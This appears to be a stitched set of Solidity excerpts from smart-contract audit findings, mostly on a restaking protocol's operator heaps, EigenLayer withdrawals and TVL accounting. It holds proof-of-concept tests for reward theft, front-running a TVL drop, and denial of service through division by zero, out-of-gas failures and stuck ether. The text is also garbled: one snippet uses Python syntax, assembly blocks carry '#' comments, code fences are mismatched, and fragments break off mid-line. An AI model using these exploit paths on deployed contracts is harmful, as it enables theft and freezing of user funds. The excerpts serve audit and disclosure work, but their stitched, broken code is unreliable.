"```\nVALIDATOR_DETAILS_POSITION.swapValidatorDetails(operatorId, fromIndex, validators.exited, validatorCount)\n```\nassembly {\n    // Load key1 into memory\n    let _part1 := sload(keyOffset1) // Load bytes 0..31\n    let _part2 := sload(add(keyOffset1, 1)) // Load bytes 32..47\n    mstore(add(key1, 0x20), _part1) // Store bytes 0..31\n    mstore(add(key1, 0x30), shr(128, _part2)) // Store bytes 16..47\n\n    isEmpty := iszero(or(_part1, _part2)) // Store if key1 is empty\n\n    // Load key2 into memory\n    let _part1 := sload(keyOffset2) // Load bytes 0..31\n    let _part2 := sload(add(keyOffset2, 1)) // Load bytes 32..47\n    mstore(add(key2, 0x20), _part1) // Store bytes 0..31\n    mstore(add(key2, 0x30), shr(128, _part2)) // Store bytes 16..47\n\n    isEmpty := or(isEmpty, iszero(or(_part1, _part2))) // Store if key1 or key2 is empty\n}\n```\n```\nbytes memory key1 = new bytes(48);\nbytes memory key2 = new bytes(48);\n```\n```\nmstore(add(key1, 0x20), _part1)\nmstore(add(key1, 0x30), shr(128, _part2))\n```\n```\nbytes32 _part1 = 0x95cfcb859956953f9834f8b14cdaa939e472a2b5d0471addbe490b97ed99c6eb;\n```\n```\nbytes32 _part2 = \n    bytes32(bytes16(0x8af94bc3ba4d4bfa93d087d522e4b78d));\n```\n```\nbytes memory key1 = new bytes(48);\n```\n```\nassembly {\n    mstore(add(key1, 0x20), _part1)  # Store bytes 0..31\n    mstore(add(key1, 0x30), shr(128, _part2))  # Store bytes 16..47\n}\n```\n```\n!memdump\n[0x00:0x20]: 0x0000000000000000000000000000000000000000000000000000000000000000\n[0x20:0x40]: 0x0000000000000000000000000000000000000000000000000000000000000000\n[0x40:0x60]: 0x00000000000000000000000000000000000000000000000000000000000000e0\n[0x60:0x80]: 0x0000000000000000000000000000000000000000000000000000000000000000\n[0x80:0xa0]: 0x0000000000000000000000000000000000000000000000000000000000000030\n[0xa0:0xc0]: 0x95cfcb859956953f9834f8b14cdaa93900000000000000000000000000000000\n[0xc0:0xe0]: 0x8af94bc3ba4d4bfa93d087d522e4b78d00000000000000000000000000000000\n```"
"```\nfunction getOperatorUtilizationHeapForETH(\n    RioLRTOperatorRegistryStorageV1.StorageV1 storage s\n) internal view returns (OperatorUtilizationHeap.Data memory heap) {\n    uint8 numActiveOperators = s.activeOperatorCount;\n    if (numActiveOperators == 0) {\n        return OperatorUtilizationHeap.Data(new OperatorUtilizationHeap.Operator[](0), 0);\n    }\n\n    heap = OperatorUtilizationHeap.initialize(MAX_ACTIVE_OPERATOR_COUNT);\n\n    uint256 activeDeposits;\n    IRioLRTOperatorRegistry.OperatorValidatorDetails memory validators;\n\n    unchecked {\n        uint8 i;\n        for (i = 0; i < numActiveOperators; ++i) {\n            uint8 operatorId = s.activeOperatorsByETHDepositUtilization.get(i);\n\n            // Non-existent operator ID. We've reached the end of the heap.\n            if (operatorId == 0) {\n                break;\n            }\n\n            validators = s.operatorDetails[operatorId].validatorDetails;\n            activeDeposits = validators.deposited - validators.exited;\n            heap.operators[i + 1] = OperatorUtilizationHeap.Operator({\n                id: operatorId,\n                utilization: activeDeposits.divWad(validators.cap)\n            });\n        }\n        heap.count = i;\n    }\n}\n```\n```\nfunction deallocateETHDeposits(uint256 depositsToDeallocate) external onlyCoordinator returns (uint256 depositsDeallocated, OperatorETHDeallocation[] memory deallocations) {\n    deallocations = new OperatorETHDeallocation[](s.activeOperatorCount);\n\n    OperatorUtilizationHeap.Data memory heap = s.getOperatorUtilizationHeapForETH();\n    if (heap.isEmpty()) revert NO_AVAILABLE_OPERATORS_FOR_DEALLOCATION();\n\n    uint256 deallocationIndex;\n    uint256 remainingDeposits = depositsToDeallocate;\n\n    bytes memory pubKeyBatch;\n    while (remainingDeposits > 0) {\n        uint8 operatorId = heap.getMax().id;\n\n        OperatorDetails storage operator = s.operatorDetails[operatorId];\n        OperatorValidatorDetails memory validators = operator.validatorDetails;\n\n        uint256 activeDeposits = validators.deposited - validators.exited;\n\n        if (activeDeposits == 0) break;\n\n        // Code to deallocate deposits\n    }\n}\n```\n```\nfunction reportOutOfOrderValidatorExits(uint8 operatorId, uint256 fromIndex, uint256 validatorCount) external {\n    // Swap the position of the validators starting from the `fromIndex` with the validators that were next in line to be exited.\n    VALIDATOR_DETAILS_POSITION.swapValidatorDetails(operatorId, fromIndex, validators.exited, validatorCount);\n    operator.validatorDetails.exited += uint40(validatorCount);\n\n    emit OperatorOutOfOrderValidatorExitsReported(operatorId, validatorCount);\n}\n```\n```\nfunction test_RemovingValidatorMessesTheHeap() public {\n    OperatorUtilizationHeap.Data memory heap = OperatorUtilizationHeap.initialize(5);\n\n    heap.insert(OperatorUtilizationHeap.Operator({id: 1, utilization: 5}));\n    heap.store(heapStore);\n\n    heap.insert(OperatorUtilizationHeap.Operator({id: 2, utilization: 10}));\n    heap.store(heapStore);\n\n    heap.insert(OperatorUtilizationHeap.Operator({id: 3, utilization: 15}));\n    heap.store(heapStore);\n\n    uint8 numActiveOperators = 3;\n    OperatorUtilizationHeap.Data memory newHeap = OperatorUtilizationHeap.initialize(64);\n    uint8 i;\n    for (i = 0; i < numActiveOperators; ++i) {\n        uint8 operatorId = heapStore.get(i);\n        if (operatorId == 0) break;\n\n        newHeap.operators[i + 1] = OperatorUtilizationHeap.Operator({\n            id: operatorId,\n            utilization: heap.operators[operatorId].utilization\n        });\n    }\n    newHeap.count = i;\n\n    heap.updateUtilizationByID(3, 0);\n\n    console.log(""1st"", heap.operators[1].id);\n    console.log(""2nd"", heap.operators[2].id);\n    console.log(""3rd"", heap.operators[3].id);\n    console.log(""origin heaps min"", heap.getMin().id);\n    console.log(""origin heaps max"", heap.getMax().id);\n\n    console.log(""1st"", newHeap.operators[1].id);\n    console.log(""2nd"", newHeap.operators[2].id);\n    console.log(""3rd"", newHeap.operators[3].id);\n    console.log(""new heaps min"", newHeap.getMin().id);\n    console.log(""new heaps max"", newHeap.getMax().id);\n\n    assertEq(newHeap.getMin().id, 1);\n    assertEq(heap.getMin().id, 3);\n    assertEq(heap.getMax().id, 2);\n    assertEq(newHeap.getMax().id, 3);\n}\n```"
"```\nfunction setOperatorStrategyCap(\n    RioLRTOperatorRegistryStorageV1.StorageV1 storage s,\n    uint8 operatorId,\n    IRioLRTOperatorRegistry.StrategyShareCap memory newShareCap\n) internal {\n    OperatorUtilizationHeap.Data memory utilizationHeap = s.getOperatorUtilizationHeapForStrategy(newShareCap.strategy);\n\n    if (currentShareDetails.cap > 0 && newShareCap.cap == 0) {\n        if (currentShareDetails.allocation > 0) {\n            operatorDetails.queueOperatorStrategyExit(operatorId, newShareCap.strategy);\n        }\n        utilizationHeap.removeByID(operatorId);\n    }\n\n    utilizationHeap.store(s.activeOperatorsByStrategyShareUtilization[newShareCap.strategy]);\n}\n```\n```\nfunction _remove(Data memory self, uint8 i) internal pure {\n    self.operators[i] = self.operators[self.count--];\n}\n```\n```\nfunction test_removingDoesNotUpdatesStoredHeap() public {\n    OperatorUtilizationHeap.Data memory heap = OperatorUtilizationHeap.initialize(5);\n\n    heap.insert(OperatorUtilizationHeap.Operator({id: 1, utilization: 50}));\n    heap.store(heapStore);\n\n    heap.insert(OperatorUtilizationHeap.Operator({id: 2, utilization: 60}));\n    heap.store(heapStore);\n\n    heap.insert(OperatorUtilizationHeap.Operator({id: 3, utilization: 70}));\n    heap.store(heapStore);\n\n    console.log(""Heaps count"", heap.count);\n    console.log(""1st"", heap.operators[1].id);\n    console.log(""2nd"", heap.operators[2].id);\n    console.log(""3rd"", heap.operators[3].id);\n\n    heap.removeByID(3);\n    heap.store(heapStore);\n\n    console.log(""Heaps count"", heap.count);\n    console.log(""1st"", heap.operators[1].id);\n    console.log(""2nd"", heap.operators[2].id);\n    console.log(""3rd"", heap.operators[3].id);\n}\n```\n```\nfunction rebalance(address asset) external checkRebalanceDelayMet(asset) {\n    (\n        uint256 sharesReceived,\n        bool isDepositCapped\n    ) = depositPool().depositBalanceIntoEigenLayer(asset);\n}\n```\n```\nfunction depositBalanceIntoEigenLayer(address asset) external onlyCoordinator returns (uint256, bool) {\n    uint256 amountToDeposit = asset.getSelfBalance();\n    if (amountToDeposit == 0) {\n        return (0, false);\n    }\n    // -> return (OperatorOperations.depositTokenToOperators(operatorRegistry(), asset, strategy, sharesToAllocate), isDepositCapped);\n    return (OperatorOperations.depositTokenToOperators(operatorRegistry(), asset, strategy, sharesToAllocate), isDepositCapped);\n}\n```\n```\nfunction depositTokenToOperators(\n    IRioLRTOperatorRegistry operatorRegistry,\n    address token,\n    address strategy,\n    uint256 sharesToAllocate\n) internal returns (uint256 sharesReceived) {\n    (\n        uint256 sharesAllocated,\n        IRioLRTOperatorRegistry.OperatorStrategyAllocation[] memory allocations\n    ) = operatorRegistry.allocateStrategyShares(\n        strategy,\n        sharesToAllocate\n    );\n   .\n   .\n}\n```\n```\nfunction allocateStrategyShares(\n    address strategy,\n    uint256 sharesToAllocate\n) external onlyDepositPool returns (uint256 sharesAllocated, OperatorStrategyAllocation[] memory allocations) {\n    OperatorUtilizationHeap.Data memory heap = s.getOperatorUtilizationHeapForStrategy(strategy);\n    //... rest of the code...\n}\n```\n```\nfunction getOperatorUtilizationHeapForStrategy(\n    RioLRTOperatorRegistryStorageV1.StorageV1 storage s,\n    address strategy\n) internal view returns (OperatorUtilizationHeap.Data memory heap) {\n    uint8 numActiveOperators = s.activeOperatorCount;\n    if (numActiveOperators == 0) {\n        return OperatorUtilizationHeap.Data(new OperatorUtilizationHeap.Operator[](0), 0);\n    }\n\n    heap = OperatorUtilizationHeap.initialize(MAX_ACTIVE_OPERATOR_COUNT);\n    LibMap.Uint8Map storage operators = s.activeOperatorsByStrategyShareUtilization[strategy];\n\n    IRioLRTOperatorRegistry.OperatorShareDetails memory operatorShares;\n    unchecked {\n        uint8 i;\n        for (i = 0; i < numActiveOperators; ++i) {\n            uint8 operatorId = operators.get(i);\n\n            if (operatorId == 0) {\n                break;\n            }\n\n            operatorShares = s.operatorDetails[operatorId].shareDetails[strategy];\n            heap.operators[i + 1] = OperatorUtilizationHeap.Operator({\n                id: operatorId,\n                utilization: operatorShares.allocation.divWad(operatorShares.cap)\n            });\n        }\n        heap.count = i;\n    }\n}\n```\n```\nutilization = operatorShares.allocation.divWad(operatorShares.cap)\n```\n```\nfunction test_Capped0ValidatorBricksFlow() public {\n    // Add 3 operators\n    addOperatorDelegators(reLST.operatorRegistry, address(reLST.rewardDistributor), 3);\n\n    uint256 AMOUNT = 1002e18;\n\n    // Allocate to cbETH strategy.\n    cbETH.approve(address(reLST.coordinator), type(uint256).max);\n    uint256 lrtAmount = reLST.coordinator.deposit(CBETH_ADDRESS, AMOUNT);\n\n    // Push funds into EigenLayer.\n    vm.prank(EOA, EOA);\n    reLST.coordinator.rebalance(CBETH_ADDRESS);\n\n    // Build the empty caps\n    IRioLRTOperatorRegistry.StrategyShareCap[] memory zeroStrategyShareCaps = new IRioLRTOperatorRegistry.StrategyShareCap[](1);\n    zeroStrategyShareCaps[0] = IRioLRTOperatorRegistry.StrategyShareCap({strategy: CBETH_STRATEGY, cap: 0});\n\n    // Set the caps of CBETH_STRATEGY for operator 2 as ""0""\n    reLST.operatorRegistry.setOperatorStrategyShareCaps(2, zeroStrategyShareCaps);\n\n    // Try an another deposit, we expect revert when we do the rebalance\n    reLST.coordinator.deposit(CBETH_ADDRESS, 10e18);\n\n    // Push funds into EigenLayer. Expect revert, due to division by ""0""\n    vm.startPrank(EOA, EOA);\n    vm.expectRevert(bytes4(keccak256(""DivWadFailed()"")));\n    reLST.coordinator.rebalance(CBETH_ADDRESS);\n    vm.stopPrank();\n}\n```"
"```\nif (validatorDetails.cap > 0 && newValidatorCap == 0) {\n    if (activeDeposits > 0) {\n        operatorDetails.queueOperatorStrategyExit(operatorId, BEACON_CHAIN_STRATEGY);\n    }\n}\nelse if (validatorDetails.cap == 0 && newValidatorCap > 0) {\n}\nelse {\n}\n```\n```\nfunction queueOperatorStrategyExit(\n    IRioLRTOperatorRegistry.OperatorDetails storage operator,\n    uint8 operatorId,\n    address strategy\n) internal {\n    IRioLRTOperatorDelegator delegator = IRioLRTOperatorDelegator(operator.delegator);\n\n    uint256 sharesToExit;\n    if (strategy == BEACON_CHAIN_STRATEGY) {\n        int256 eigenPodShares = delegator.getEigenPodShares();\n        if (eigenPodShares > 0) {\n            sharesToExit = uint256(eigenPodShares).reducePrecisionToGwei();\n        }\n    }\n}\n```\n```\nfunction queueETHWithdrawalFromOperatorsForUserSettlement(\n    IRioLRTOperatorRegistry operatorRegistry,\n    uint256 amount\n) internal returns (bytes32 aggregateRoot) {\n    for (uint256 i = 0; i < length; ++i) {\n        address delegator = operatorDepositDeallocations[i].delegator;\n\n        uint256 amountToWithdraw = (i == length - 1)\n           ? remainingAmount\n            : operatorDepositDeallocations[i].deposits * ETH_DEPOSIT_SIZE;\n\n        remainingAmount -= amountToWithdraw;\n        roots[i] = IRioLRTOperatorDelegator(delegator).queueWithdrawalForUserSettlement(\n            BEACON_CHAIN_STRATEGY,\n            amountToWithdraw\n        );\n    }\n}\n```\n```\nfunction scrapeExcessFullWithdrawalETHFromEigenPod() external {\n    uint256 ethWithdrawable = eigenPod.withdrawableRestakedExecutionLayerGwei().toWei();\n    uint256 ethQueuedForWithdrawal = getETHQueuedForWithdrawal();\n    if (ethWithdrawable <= ethQueuedForWithdrawal + MIN_EXCESS_FULL_WITHDRAWAL_ETH_FOR_SCRAPE) {\n        revert INSUFFICIENT_EXCESS_FULL_WITHDRAWAL_ETH();\n    }\n    _queueWithdrawalForOperatorExitOrScrape(BEACON_CHAIN_STRATEGY, ethWithdrawable - ethQueuedForWithdrawal);\n}\n```\n```\nfunction test_StuckEther() public {\n    uint8 operatorId = addOperatorDelegator(reETH.operatorRegistry, address(reETH.rewardDistributor));\n    address operatorDelegator = reETH.operatorRegistry.getOperatorDetails(operatorId).delegator;\n\n    uint256 TVL = 64 ether;\n    uint256 WITHDRAWAL_AMOUNT = 63 ether;\n    RioLRTOperatorDelegator delegatorContract = RioLRTOperatorDelegator(payable(operatorDelegator));\n\n    // Allocate ETH.\n    reETH.coordinator.depositETH{value: TVL - address(reETH.depositPool).balance}();\n\n    // Push funds into EigenLayer.\n    vm.prank(EOA, EOA);\n    reETH.coordinator.rebalance(ETH_ADDRESS);\n\n    // Verify validator withdrawal credentials.\n    uint40[] memory validatorIndices = verifyCredentialsForValidators(reETH.operatorRegistry, operatorId, 2);\n\n    // Verify and process two full validator exits.\n    verifyAndProcessWithdrawalsForValidatorIndexes(operatorDelegator, validatorIndices);\n\n    // Withdraw some funds.\n    reETH.coordinator.requestWithdrawal(ETH_ADDRESS, WITHDRAWAL_AMOUNT);\n    uint256 withdrawalEpoch = reETH.withdrawalQueue.getCurrentEpoch(ETH_ADDRESS);\n\n    // Skip ahead and rebalance to queue the withdrawal within EigenLayer.\n    skip(reETH.coordinator.rebalanceDelay());\n\n    vm.prank(EOA, EOA);\n    reETH.coordinator.rebalance(ETH_ADDRESS);\n\n    // Verify and process two full validator exits.\n    verifyAndProcessWithdrawalsForValidatorIndexes(operatorDelegator, validatorIndices);\n\n    // Settle with withdrawal epoch.\n    IDelegationManager.Withdrawal[] memory withdrawals = new IDelegationManager.Withdrawal[](1);\n    withdrawals[0] = IDelegationManager.Withdrawal({\n        staker: operatorDelegator,\n        delegatedTo: address(1),\n        withdrawer: address(reETH.withdrawalQueue),\n        nonce: 0,\n        startBlock: 1,\n        strategies: BEACON_CHAIN_STRATEGY.toArray(),\n        shares: WITHDRAWAL_AMOUNT.toArray()\n    });\n    reETH.withdrawalQueue.settleEpochFromEigenLayer(ETH_ADDRESS, withdrawalEpoch, withdrawals, new uint256[](1));\n\n    vm.expectRevert(bytes4(keccak256(""INSUFFICIENT_EXCESS_FULL_WITHDRAWAL_ETH()"")));\n    delegatorContract.scrapeExcessFullWithdrawalETHFromEigenPod();\n}\n```"
"```\nreceive() external payable {\n    (bool success,) = address(rewardDistributor()).call{value: msg.value}('');\n    require(success);\n}\n```\n```\nimport {\n    IRioLRTWithdrawalQueue\n} from 'contracts/interfaces/IRioLRTWithdrawalQueue.sol';\n\nimport {\n    IRioLRTOperatorRegistry\n} from 'contracts/interfaces/IRioLRTOperatorRegistry.sol';\n\nimport {\n    CredentialsProofs,\n    BeaconWithdrawal\n} from 'test/utils/beacon-chain/MockBeaconChain.sol';\n```\n```\nfunction test_stealRewards() public {\n    address alice = makeAddr(""alice"");\n    address bob = makeAddr(""bob"");\n    uint256 aliceInitialBalance = 40e18;\n    uint256 bobInitialBalance = 40e18;\n    deal(alice, aliceInitialBalance);\n    deal(bob, bobInitialBalance);\n\n    vm.prank(alice);\n    reETH.token.approve(address(reETH.coordinator), type(uint256).max);\n\n    vm.prank(bob);\n    reETH.token.approve(address(reETH.coordinator), type(uint256).max);\n\n    uint8 operatorId = addOperatorDelegator(reETH.operatorRegistry, address(reETH.rewardDistributor));\n    RioLRTOperatorDelegator operatorDelegator = RioLRTOperatorDelegator(payable(reETH.operatorRegistry.getOperatorDetails(operatorId).delegator));\n\n    vm.prank(alice);\n    reETH.coordinator.depositETH{value: aliceInitialBalance}();\n\n    vm.prank(EOA, EOA);\n    reETH.coordinator.rebalance(ETH_ADDRESS);\n\n    uint40[] memory validatorIndices = new uint40[](1);\n    IRioLRTOperatorRegistry.OperatorPublicDetails memory details = reETH.operatorRegistry.getOperatorDetails(operatorId);\n    bytes32 withdrawalCredentials = operatorDelegator.withdrawalCredentials();\n    beaconChain.setNextTimestamp(block.timestamp);\n    CredentialsProofs memory proofs;\n    (validatorIndices[0], proofs) = beaconChain.newValidator({\n        balanceWei: 40 ether,\n        withdrawalCreds: abi.encodePacked(withdrawalCredentials)\n    });\n\n    vm.prank(details.manager);\n    reETH.operatorRegistry.verifyWithdrawalCredentials(\n        operatorId,\n        proofs.oracleTimestamp,\n        proofs.stateRootProof,\n        proofs.validatorIndices,\n        proofs.validatorFieldsProofs,\n        proofs.validatorFields\n    );\n\n    verifyAndProcessWithdrawalsForValidatorIndexes(address(operatorDelegator), validatorIndices);\n\n    {\n        vm.startPrank(bob);\n        reETH.coordinator.depositETH{value: bobInitialBalance}();\n\n        uint256 TVLBefore = reETH.assetRegistry.getTVL();\n        delayedWithdrawalRouter.claimDelayedWithdrawals(address(operatorDelegator), 1);\n        uint256 TVLAfter = reETH.assetRegistry.getTVL();\n\n        assertEq(TVLAfter - TVLBefore, 7.2e18);\n\n        reETH.coordinator.requestWithdrawal(ETH_ADDRESS, reETH.token.balanceOf(bob"
"```\n(bool success,) = recipient.call{value: amount, gas: 10_000}('');\nif (!success) {\n    revert ETH_TRANSFER_FAILED();\n}\n```\n```\nimport {\n    IRioLRTOperatorRegistry\n} from 'contracts/interfaces/IRioLRTOperatorRegistry.sol';\n\nimport {\n    RioLRTOperatorDelegator\n} from 'contracts/restaking/RioLRTOperatorDelegator.sol';\n\nimport {\n    CredentialsProofs,\n    BeaconWithdrawal\n} from 'test/utils/beacon-chain/MockBeaconChain.sol';\n```\n```\nfunction test_outOfGasOnRewards() public {\n    address alice = makeAddr(""alice"");\n    uint256 initialBalance = 40e18;\n    deal(alice, initialBalance);\n    vm.prank(alice);\n    reETH.token.approve(address(reETH.coordinator), type(uint256).max);\n\n    uint8 operatorId = addOperatorDelegator(reETH.operatorRegistry, address(reETH.rewardDistributor));\n    RioLRTOperatorDelegator operatorDelegator = RioLRTOperatorDelegator(payable(reETH.operatorRegistry.getOperatorDetails(operatorId).delegator));\n\n    vm.prank(alice);\n    reETH.coordinator.depositETH{value: initialBalance}();\n\n    vm.prank(EOA, EOA);\n    reETH.coordinator.rebalance(ETH_ADDRESS);\n\n    uint40[] memory validatorIndices = new uint40[](1);\n    IRioLRTOperatorRegistry.OperatorPublicDetails memory details = reETH.operatorRegistry.getOperatorDetails(operatorId);\n    bytes32 withdrawalCredentials = operatorDelegator.withdrawalCredentials();\n    beaconChain.setNextTimestamp(block.timestamp);\n    CredentialsProofs memory proofs;\n    (validatorIndices[0], proofs) = beaconChain.newValidator({\n        balanceWei: 40 ether,\n        withdrawalCreds: abi.encodePacked(withdrawalCredentials)\n    });\n\n    vm.prank(details.manager);\n    reETH.operatorRegistry.verifyWithdrawalCredentials(\n        operatorId,\n        proofs.oracleTimestamp,\n        proofs.stateRootProof,\n        proofs.validatorIndices,\n        proofs.validatorFieldsProofs,\n        proofs.validatorFields\n    );\n\n    verifyAndProcessWithdrawalsForValidatorIndexes(address(operatorDelegator), validatorIndices);\n\n    delayedWithdrawalRouter.claimDelayedWithdrawals(address(operatorDelegator), 1); // Reverts for out-of-gas\n}\n```"
"```\nimport {\n    IRioLRTOperatorRegistry\n} from 'contracts/interfaces/IRioLRTOperatorRegistry.sol';\n\nimport {\n    RioLRTOperatorDelegator\n} from 'contracts/restaking/RioLRTOperatorDelegator.sol';\n\nimport {\n    CredentialsProofs,\n    BeaconWithdrawal\n} from 'test/utils/beacon-chain/MockBeaconChain.sol';\n```\n```\nIRioLRTOperatorRegistry.StrategyShareCap[] public emptyStrategyShareCaps;\n\nfunction test_avoidInstantPriceDrop() public {\n    // Add two operators with 1 validator each\n    uint8[] memory operatorIds = addOperatorDelegators(\n        reETH.operatorRegistry,\n        address(reETH.rewardDistributor),\n        2,\n        emptyStrategyShareCaps,\n        1\n    );\n    address operatorAddress0 = address(uint160(1));\n\n    // Deposit ETH so there's 74ETH in the deposit pool\n    uint256 depositAmount = 2 * ETH_DEPOSIT_SIZE - address(reETH.depositPool).balance;\n    uint256 amountToWithdraw = 10 ether;\n    reETH.coordinator.depositETH{value: amountToWithdraw + depositAmount}();\n\n    // Stake the 64ETH on the validators, 32ETH each and 10 ETH stay in the deposit pool\n    vm.prank(EOA, EOA);\n    reETH.coordinator.rebalance(ETH_ADDRESS);\n\n    // Attacker notices a validator is going receive penalties and immediately requests a withdrawal of 10ETH\n    reETH.coordinator.requestWithdrawal(ETH_ADDRESS, amountToWithdraw);\n\n    // Validator gets some penalties and Eigenlayer notified\n    // IMPORTANT: The following block of code is a simulation of what would happen if a validator balances gets lowered because of penalties\n    // and `verifyBalanceUpdates()` gets called on Eigenlayer. It uses another bug to achieve an instant loss of TVL.\n\n    // ~~~Start penalties simulation~~~\n    {\n        // Verify validators credentials of the two validators\n        verifyCredentialsForValidators(reETH.operatorRegistry, 1, 1);\n        verifyCredentialsForValidators(reETH.operatorRegistry, 2, 1);\n\n        // Cache current TVL and ETH Balance\n        uint256 TVLBefore = reETH.coordinator.getTVL();\n\n        // Operator calls `undelegate()` on Eigenlayer\n        // IMPORTANT: This achieves the same as calling `verifyBalanceUpdates()` on Eigenlayer after a validator suffered penalties,\n        // an instant drop in TVL.\n        IRioLRTOperatorRegistry.OperatorPublicDetails memory details = reETH.operatorRegistry.getOperatorDetails(operatorIds[0]);\n        vm.prank(operatorAddress0);\n        delegationManager.undelegate(details.delegator);\n\n        // TVL dropped\n        uint256 TVLAfter = reETH.coordinator.getTVL();\n\n        assertLt(TVLAfter, TVLBefore);\n    }"
"```\nfunction getTVLForAsset(address asset) public view returns (uint256) {\n    uint256 balance = getTotalBalanceForAsset(asset);\n    if (asset == ETH_ADDRESS) {\n        return balance;\n    }\n    return convertToUnitOfAccountFromAsset(asset, balance);\n}\n\nfunction getTotalBalanceForAsset(address asset) public view returns (uint256) {\n    if (!isSupportedAsset(asset)) {\n        revert ASSET_NOT_SUPPORTED(asset);\n    }\n\n    address depositPool_ = address(depositPool());\n    if (asset == ETH_ADDRESS) {\n        return depositPool_.balance + getETHBalanceInEigenLayer();\n    }\n\n    uint256 sharesHeld = getAssetSharesHeld(asset);\n    uint256 tokensInRio = IERC20(asset).balanceOf(depositPool_);\n    uint256 tokensInEigenLayer = convertFromSharesToAsset(getAssetStrategy(asset), sharesHeld);\n\n    return tokensInRio + tokensInEigenLayer;\n}\n\nfunction getETHBalanceInEigenLayer() public view returns (uint256 balance) {\n    balance = ethBalanceInUnverifiedValidators;\n\n    IRioLRTOperatorRegistry operatorRegistry_ = operatorRegistry();\n    uint8 endAtID = operatorRegistry_.operatorCount() + 1; // Operator IDs start at 1.\n    for (uint8 id = 1; id < endAtID; ++id) {\n        balance += operatorDelegator(operatorRegistry_, id).getETHUnderManagement();\n    }\n}\n```\n```\nfunction getEigenPodShares() public view returns (int256) {\n    return eigenPodManager.podOwnerShares(address(this));\n}\n\nfunction getETHQueuedForWithdrawal() public view returns (uint256) {\n    uint256 ethQueuedSlotData;\n    assembly {\n        ethQueuedSlotData := sload(ethQueuedForUserSettlementGwei.slot)\n    }\n\n    uint64 userSettlementGwei = uint64(ethQueuedSlotData);\n    uint64 operatorExitAndScrapeGwei = uint64(ethQueuedSlotData) << 64;\n\n    return (userSettlementGwei + operatorExitAndScrapeGwei).toWei();\n}\n\nfunction getETHUnderManagement() external view returns (uint256) {\n    int256 aum = getEigenPodShares() + int256(getETHQueuedForWithdrawal());\n    if (aum < 0) {\n        return 0;\n    }\n\n    return uint256(aum);\n}\n```"
"```\nuint256 availableShares = \n    assetRegistry().convertToSharesFromAsset(asset, \n                                            assetRegistry().getTotalBalanceForAsset(asset));\n```\n```\nfunction getTotalBalanceForAsset(\n    address asset\n) public view returns (uint256) {\n    if (!isSupportedAsset(asset)) {\n        revert ASSET_NOT_SUPPORTED(asset);\n    }\n\n    address depositPool_ = address(depositPool());\n    if (asset == ETH_ADDRESS) {\n        return depositPool_.balance + getETHBalanceInEigenLayer();\n    }\n\n    uint256 sharesHeld = getAssetSharesHeld(asset);\n    uint256 tokensInRio = IERC20(asset).balanceOf(depositPool_);\n    uint256 tokensInEigenLayer = convertFromSharesToAsset(\n        getAssetStrategy(asset),\n        sharesHeld\n    );\n\n    return tokensInRio + tokensInEigenLayer;\n}\n```"
"```\nuint256 balanceBefore = asset.getSelfBalance();\n\naddress[] memory assets = asset.toArray();\nbytes32[] memory roots = new bytes32[](queuedWithdrawalCount);\n\nIDelegationManager.Withdrawal memory queuedWithdrawal;\nfor (uint256 i = 0; i < queuedWithdrawalCount; ++i) {\n    queuedWithdrawal = queuedWithdrawals[i];\n\n    roots[i] = _computeWithdrawalRoot(queuedWithdrawal);\n    delegationManager.completeQueuedWithdrawal(queuedWithdrawal, assets, middlewareTimesIndexes[i], true);\n\n    if (asset == ETH_ADDRESS) {\n        IRioLRTOperatorDelegator(queuedWithdrawal.staker).decreaseETHQueuedForUserSettlement(queuedWithdrawal.shares[0]);\n    }\n}\n\nif (epochWithdrawals.aggregateRoot!= keccak256(abi.encode(roots))) {\n    revert INVALID_AGGREGATE_WITHDRAWAL_ROOT();\n}\n\nepochWithdrawals.shareValueOfAssetsReceived = SafeCast.toUint120(epochWithdrawals.sharesOwed);\n\nuint256 assetsReceived = asset.getSelfBalance() - balanceBefore;\nepochWithdrawals.assetsReceived += SafeCast.toUint120(assetsReceived);\n```\n```\nelse {\n    podOwnerShares[podOwner] += int256(shares);\n    emit PodSharesUpdated(podOwner, int256(shares));\n    return;\n}\n```"
"```\nsharesOwed = convertToSharesFromRestakingTokens(asset, amountIn)\n```\nepochWithdrawals.assetsReceived = SafeCast.toUint120(assetsReceived)\n```\n```\nepochWithdrawals.assetsReceived = SafeCast.toUint120(assetsReceived)\n```\nepochWithdrawals.assetsReceived += \n    SafeCast.toUint120(assetsReceived);\n```\n```\namountOut = userSummary.sharesOwed.mulDiv(epochWithdrawals.assetsReceived, epochWithdrawals.sharesOwed)\n```"
"```\nif (SignedMath.abs(tokensToSwap) > params.sideTokensAmount):\n    if (SignedMath.abs(tokensToSwap) - params.sideTokensAmount < params.sideTokensAmount / 10000):\n        tokensToSwap = SignedMath.revabs(params.sideTokensAmount, True)\n```"
"```\nfunction mint(\n    IPositionManager.MintParams calldata params\n) external override returns (uint256 tokenId, uint256 premium) {\n    IDVP dvp = IDVP(params.dvpAddr);\n\n    if (params.tokenId!= 0) {\n        tokenId = params.tokenId;\n        ManagedPosition storage position = _positions[tokenId];\n\n        if (ownerOf(tokenId)!= msg.sender) {\n            revert NotOwner();\n        }\n        if (position.dvpAddr!= params.dvpAddr || position.strike!= params.strike) {\n            revert InvalidTokenID();\n        }\n        Epoch memory epoch = dvp.getEpoch();\n        if (position.expiry!= epoch.current) {\n            revert PositionExpired();\n        }\n    }\n    if ((params.notionalUp > 0 && params.notionalDown > 0) && (params.notionalUp!= params.notionalDown)) {\n        revert AsymmetricAmount();\n    }\n\n    uint256 obtainedPremium;\n    uint256 fee;\n    (obtainedPremium, fee) = dvp.premium(params.strike, params.notionalUp, params.notionalDown);\n\n    // Transfer premium:\n    IERC20 baseToken = IERC20(dvp.baseToken());\n    baseToken.safeTransferFrom(msg.sender, address(this), obtainedPremium);\n\n    // Premium already include fee\n    baseToken.safeApprove(params.dvpAddr, obtainedPremium);\n\n    premium = dvp.mint(\n        address(this),\n        params.strike,\n        params.notionalUp,\n        params.notionalDown,\n        params.expectedPremium,\n        params.maxSlippage,\n        params.nftAccessTokenId\n    );\n}\n```\n```\n/// @inheritdoc IDVP\nfunction mint(\n    address recipient,\n    uint256 strike,\n    uint256 amountUp,\n    uint256 amountDown,\n    uint256 expectedPremium,\n    uint256 maxSlippage,\n    uint256 nftAccessTokenId\n) external override returns (uint256 premium_) {\n    _checkNFTAccess(nftAccessTokenId, recipient, amountUp + amountDown);\n    Amount memory amount_ = Amount({up: amountUp, down: amountDown});\n    premium_ = _mint(recipient, financeParameters.currentStrike, amount_, expectedPremium, maxSlippage);\n}\n```\n```\nfunction mint(\n    IPositionManager.MintParams calldata params\n) external override returns (uint256 tokenId, uint256 premium) {\n    if (obtainedPremium > premium) {\n        baseToken.safeTransferFrom(address(this), msg.sender, obtainedPremium - premium);\n    }\n\n    if (params.tokenId == 